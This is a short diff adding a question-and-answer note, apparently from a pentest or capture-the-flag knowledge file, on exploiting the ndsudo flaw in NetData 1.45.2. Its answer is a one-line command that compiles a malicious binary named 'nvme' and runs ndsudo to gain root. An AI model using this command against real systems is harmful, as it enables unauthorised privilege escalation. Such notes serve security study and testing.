@@ -1,0 +1,9 @@
+TECHNIQUE / QUESTION:
+How can you exploit the ndsudo vulnerability found in NetData?
+
+CONTEXT:
+You know that NetData version 1.45.2 has a vulnerability related to ndsudo.
+
+METHOD / ANSWER:
+Command: `gcc -o nvme root.c && /opt/netdata/usr/libexec/netdata/plugins.d/ndsudo nvme-list --test`
+Explanation: This illustrates crafting a malicious binary to misuse the ndsudo executable, allowing for privilege escalation.
